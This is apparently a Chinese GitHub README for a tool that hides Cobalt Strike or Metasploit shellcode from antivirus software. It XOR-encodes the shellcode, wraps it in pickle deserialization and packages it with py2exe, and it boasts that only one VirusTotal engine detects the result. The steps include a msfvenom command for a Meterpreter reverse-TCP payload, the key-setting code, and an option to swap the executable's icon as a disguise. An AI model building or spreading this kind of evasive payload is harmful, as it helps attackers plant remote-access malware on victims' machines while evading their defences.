# CS MSF 均可使用
_描述：前阵子可动态免杀绝大部分杀软，最近发现微软的Defender 动态免杀 不了，想了想还是放出来吧，供大家参考下_

**可以的话，老哥们点个star吧 嘻嘻**

![图片](https://user-images.githubusercontent.com/46078482/106402903-dea92180-6466-11eb-8a0a-99bc5e06ec4a.png)

`1、Filehandle.py用于处理CS MSF 生成的shellcode文件 提取 shellcode`

`2、ver.py 是核心生成代码，需修改`

`3、exeSetup.py 是 py2exe 打包启动文件，可修改`

**VT上只有匹配到了1个！还是很Nice**

![图片](https://github.com/LiuYanJan/picture/blob/main/bypassav.png)



# 原理：
python 反序列化免杀

# 环境：
_测试时，我发现 python 3.7.0 这个版本兼容好，其他版本会有些问题，打包的程序可能无法正常使用！！！_

	* python 3.7.0  
	* py2exe库 【pyinstall指纹已经被很多杀软收集了】
	* python3.7.0淘宝镜像-http://npm.taobao.org/mirrors/python/3.7.0/python-3.7.0.exe
	


# 步骤
** 1、生成shellcode

	* CS 生成C语言格式
	* MSF msfvenom -a x86 -p windows/meterpreter/reverse_tcp lhost=192.168.47.147 lport=4444 -b '\x00' -f python

** 2、修改 ver.py 文件里的 shellcode值

  [1] Filehandle.py 用于处理 第一步里的 shellcode文件
  
  [2] ver.py 可修改异或密钥

          #key 设定shellcode的密钥
          key = 'liam'
          mess = get_shellcode(shellcode, key)
          #print(mess)
          ret = pickle.dumps(Student())
          decode_hex = codecs.getdecoder("hex_codec")
          encode_hex = codecs.getencoder("hex_codec")
          
          ret_hex = encode_hex(ret)[0]
          #key2 设定反序列化里的密钥
          key2 = "byav"


** 3、可在 exeSetup.py 修改生成的图标

     setup(
      options=options,    
      description = "this is a py2exe test",   
      zipfile=None,
      windows = [{"script":'launch.py',"icon_resources": [(1, u"softmgr.ico")]}]  #可选择其他图标ico
      )


** 4、运行 ver.py 后在 output 目录可查看到 launch.exe
